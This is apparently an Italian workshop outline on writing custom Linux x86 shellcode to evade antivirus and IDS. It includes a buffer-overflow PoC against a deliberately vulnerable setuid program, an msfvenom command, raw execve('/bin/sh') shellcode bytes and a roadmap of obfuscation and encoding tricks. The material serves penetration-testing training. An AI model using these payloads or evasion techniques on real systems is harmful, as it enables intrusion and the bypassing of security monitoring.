# x86 shellcoding cakestar

## Introduzione

Quando facciamo un penetration test, il più delle volte utilizziamo exploit già
pronti o usiamo strumenti come msvfenom per creare un payload con qualche
opzione particolare.

Esistono situazioni dove hai bisogno di essere più creativo: devi evitare
l'antivirus, devi nasconderti dall'IDS o semplicemente vuoi divertirti un po'
ed avere il pieno controllo del codice che sarà eseguito sulla macchina.

Ecco, in questo talk vedremo come creare 2 shellcode veramente semplici in
ambiente Linux x86 e, partendo da un codice funzionante, andremo ad aggiungere
tecniche di offuscamento, egg hunting e polimorfismo per far evolvere il nostro
payload.

Il bypass dell'antivirus forse non sarà garantito, ma il divertimento... quello
sì.

## A chi è rivolto?

Penetration tester Analisti SOC Sviluppatori

## Livello di difficoltà

BASSO

## Skill richieste

* Conoscenze base di assembler x86
* Sapere cos'è una _system call_
* Un pizzico di python o ruby o il linguaggio che più vi piace a cui accodare
  il nostro shellcode.

## Cosa mi serve

* Una macchina virtuale Linux per lo sviluppo (scriveremo assembler per x86, quindi a 32 bit).
  * Ubuntu 20.04
  * apt install apt install python3 gcc-multilib nasm gdb
  * peda: https://github.com/longld/peda
  * clonate l'archivio https://github.com/thesp0nge/HackInBoSafeEdition
  * Disabilito ASLR "echo 0 > /proc/sys/kernel/randomize_va_space"

## Preparo la vittima

Ho bisogno di compilare il programma vittima per iniziare le esercitazioni.

``` sh
$ ./compile.sh pwnme.c
$ sudo "chown root:root pwnme"
$ sudo "chmod +s pwnme"
```

## L'inizio della nostra storia

Da una analisi precedente sappiamo che il software pwnme è vulnerabile a buffer
overflow. Il contenuto del file pwnme.txt, necessario al funzionamento del
nostro tool, vieme copiato in una variabile, purtroppo senza fare un controllo
sulla lunghezza dei dati letti da file.

Nel caso il file di testo sia costituito da troppi caratteri, dopo 84 byte
avremmo la sovrascittura del registro EIP e di fatto, l'inizio della nostra
storia.

Il PoC del nostro exploit sarà questo:
``` python
#!/usr/bin/env python3

import os;

eip="BBBB"
shellcode = "A"*84+eip+"C"*200
f = open("pwnme.txt","w")
f.write(shellcode)
f.close()
```

Abbiamo provato con metasploit a generare un payload con il comando:

```sh
$ msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o a.out
```

Purtroppo veniamo individuati da alcuni antivirus, quindi dobbiamo trovare un
altro modo per scrivere il nostro shellcode.

![Il payload di msfvenom su VirusTotal](/images/msfvenom.png)

### Disclaimer

Questo talk non è su come trovare un buffer overflow ma su come customizzare il
nostro shellcode. Il programma vulnerabile quindi è stato scritto introducendo
la vulnerabilità in maniera forzata, in particolare:

* è stato aggiunto dell'inline assembler per mettere a disposizione
  l'istruzione JMP ESP
* avendo disattivato la randomizzazione dello stack, ho il nuovo valore del
  registro EIP sempre fisso

Queste tecniche possono ingannare strumenti basati su signature. Strumenti
evoluti che provano ad eseguire il codice in sandbox potrebbero comunque
riconoscere i nostri payload. Un security engineer che troverà il payload e ne
farà il reverse sarà comunque in grado di riconoscerne il contenuto malevolo.

## Shellcode

Andremo ad analizzare lo shellcode che esegue "/bin/sh" e queste saranno le tappe del nostro viaggio:
* v1.0: da dove arriva
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"?
   (https://www.virustotal.com/gui/file/d2b927c46e08ddb7f4d8471247e7008f7200ca24962094d343248e9a7a0fe870/detection)
* v2.0: manovre evasive! (https://www.virustotal.com/gui/file/93f5fc907caa0a5e00e320b59a13059e28c243f13c75ef5c5309eff23dfe15be/detection)
* v2.1: diamoci dei privilegi (https://www.virustotal.com/gui/file/1596d2642b5656ee0e8cf137c097a308329d3cbdcb238c921a605e0b148b9959/detection)
* v2.5: togliamo i null byte (https://www.virustotal.com/gui/file/d98b0c36e6dacd22f4f5b1192b7d630221346fb5b2a177eaa00dc1a944aa232f/detection)
* v3.0: nascondino (bonus tip: il mistero del segfault solitario) (https://www.virustotal.com/gui/file/9de443e65e82833c66910bbdee23b1bfea7635adcb5c8cc5a6d7cccd04d47a22/detection)
* v4.0: torniamo all'alfabeto
  + prendo il mio shellcode e lo scrivo con un set ristretto di operazioni
  + allineo il mio shellcode in modo che sia composto da un numero intero di
    parole a 32 bit. Nel caso appendo tanti \x90 alla bisogna.
  + per impostare un registro a 0 posso scegliere un numero a 32 bit a caso,
    calcolarne il NOT e poi fare l'AND tra il registrro e questi due valori.
    Come risultato avremmo che il registro sarà sempre a 0 qualsiasi sia il suo
    valore iniziale.


